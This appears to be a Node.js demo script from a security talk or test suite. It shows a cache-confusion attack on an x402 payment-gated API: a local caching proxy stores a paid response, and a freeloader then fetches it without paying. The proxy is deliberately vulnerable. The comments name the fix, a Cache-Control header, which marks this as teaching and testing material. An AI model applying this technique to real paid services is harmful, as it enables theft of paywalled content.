'use strict';
/**
 * ATTACK 2 — CACHE CONFUSION  ·  kill-chain stage 3
 *
 * Real-world anchor: the same arXiv study measured a 100% cache-leak rate on
 * nginx WITH proxy_cache enabled and an origin that sends no Cache-Control
 * (0% once the header is present; Caddy leaked 0% either way) — paid content
 * served free from the CDN. NB: nginx does not cache by default; do not say
 * "default nginx" on stage. A payment gate on the
 * origin means nothing if a cache in front stores the 200 and hands it to the
 * next caller, who never paid.
 *
 * Demo: put a caching proxy in front of the seller. A paying agent warms the
 * cache; a freeloader with NO payment then pulls the paid content out of it.
 * The only thing that stops this is a Cache-Control header on the paid route.
 */

const http = require('node:http');
const { payAndFetch } = require('../buyer/agent');
const { newAccount } = require('../lib/x402');

// A minimal, faithful caching proxy: caches GET 200s UNLESS told no-store.
function makeCachingProxy(originPort) {
  const cache = new Map();
  const server = http.createServer((req, res) => {
    const key = req.url;
    if (cache.has(key)) {                       // serve from cache to ANYONE
      const hit = cache.get(key);
      res.statusCode = 200;
      res.setHeader('x-cache', 'HIT');
      return res.end(hit.body);
    }
    const opts = { host: 'localhost', port: originPort, path: req.url, method: req.method, headers: req.headers };
    const up = http.request(opts, (r) => {
      let body = '';
      r.on('data', c => body += c);
      r.on('end', () => {
        const cc = (r.headers['cache-control'] || '');
        const cacheable = r.statusCode === 200 && !/no-store|private/i.test(cc);
        if (cacheable) cache.set(key, { body });   // <-- the whole vulnerability
        res.statusCode = r.statusCode;
        res.setHeader('x-cache', 'MISS');
        res.end(body);
      });
    });
    up.on('error', () => { res.statusCode = 502; res.end('bad gateway'); });
    req.pipe(up);
  });
  return server;
}

async function run(originPort) {
  const proxy = makeCachingProxy(originPort);
  await new Promise(r => proxy.listen(0, r));
  const proxyURL = `http://localhost:${proxy.address().port}`;

  // 1. A legitimate agent pays THROUGH the proxy — this warms the cache.
  const buyer = newAccount('paying-agent');
  const paid = await payAndFetch(proxyURL, buyer, { bind: true });

  // 2. A freeloader makes a bare request — no X-PAYMENT at all.
  const stolen = await fetch(proxyURL + '/research');
  const body = await stolen.json().catch(() => null);
  const leaked = stolen.status === 200 && body && body.answer;

  proxy.close();
  return {
    attack: 'cache-confusion',
    payingAgentStatus: paid.status,
    freeloaderStatus: stolen.status,
    freeloaderGotSecret: Boolean(leaked),
    succeeded: Boolean(leaked),
    verdict: leaked
      ? `BROKEN — freeloader pulled paid content from cache: "${body.answer.slice(0, 32)}…"`
      : `BLOCKED — cache refused to store the paid response (freeloader got ${stolen.status})`,
  };
}

module.exports = { run };

if (require.main === module) {
  run(Number(process.argv[2] || 4021)).then(r => console.log(JSON.stringify(r, null, 2)));
}
